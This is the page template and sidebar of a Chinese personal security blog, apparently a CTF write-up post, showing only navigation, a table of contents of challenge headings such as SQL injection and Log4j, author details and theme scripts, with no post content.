    <a href="/posts/64270.html" rel="prev" title="Vulnhub-Hackable:III">
      <i class="fa fa-chevron-left"></i> Vulnhub-Hackable:III
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/9478.html" rel="next" title="HMV-family">
      HMV-family <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-text">web3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web6"><span class="nav-text">web6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web8"><span class="nav-text">web8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84sql%E6%B3%A8%E5%85%A5"><span class="nav-text">基于布尔的sql注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web9"><span class="nav-text">web9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web10"><span class="nav-text">web10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web11"><span class="nav-text">web11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web12"><span class="nav-text">web12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="nav-text">红包题第二弹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web13"><span class="nav-text">web13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web14"><span class="nav-text">web14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E5%85%AD%E5%BC%B9"><span class="nav-text">红包题第六弹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%B8%83%E5%BC%B9"><span class="nav-text">红包题第七弹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%90%8C%E6%96%B0%E4%B8%93%E5%B1%9E%E7%BA%A2%E5%8C%85%E9%A2%98"><span class="nav-text">萌新专属红包题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFshow-web1"><span class="nav-text">CTFshow web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#game-gyctf-web2"><span class="nav-text">game-gyctf web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web15-Fishman"><span class="nav-text">web15 Fishman</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%B9%9D%E5%BC%B9"><span class="nav-text">红包题第九弹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98-%E8%91%B5%E8%8A%B1%E5%AE%9D%E5%85%B8"><span class="nav-text">红包题 葵花宝典</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98-%E8%BE%9F%E9%82%AA%E5%89%91%E8%B0%B1"><span class="nav-text">红包题 辟邪剑谱</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E3%80%90nl%E3%80%91%E9%9A%BE%E4%BA%86"><span class="nav-text">【nl】难了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E5%88%87%E7%9C%8B%E8%B5%B7%E6%9D%A5%E9%83%BD%E9%82%A3%E4%B9%88%E5%90%88%E6%83%85%E5%90%88%E7%90%86"><span class="nav-text">一切看起来都那么合情合理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98-%E8%80%97%E5%AD%90%E5%B0%BE%E6%B1%81"><span class="nav-text">红包题 耗子尾汁</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%B0%E5%B9%B4%E5%A5%BD%EF%BC%9F"><span class="nav-text">新年好？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E4%B8%80"><span class="nav-text">红包一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Log4j-%E5%A4%8D%E7%8E%B0"><span class="nav-text">Log4j 复现</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">68</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/posts/37991.html" title="posts&#x2F;37991.html">web方向wp</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/62478.html" title="posts&#x2F;62478.html">HMV-easypwn WP复现与复盘</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/51504.html" title="posts&#x2F;51504.html">HTTP请求走私漏洞学习</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/57863.html" title="posts&#x2F;57863.html">HMV-Driftingblues3</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/53614.html" title="posts&#x2F;53614.html">flask框架&&ssti学习笔记</a>
        </li>
    </ul>
  </div>
      </div>

      
      
        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
          <div class="links-of-blogroll-title">
            <i class="fa fa-history fa-" aria-hidden="true"></i>
            
          </div>
          <ul class="links-of-blogroll-list">
            
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
          </ul>
        </div>
      
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
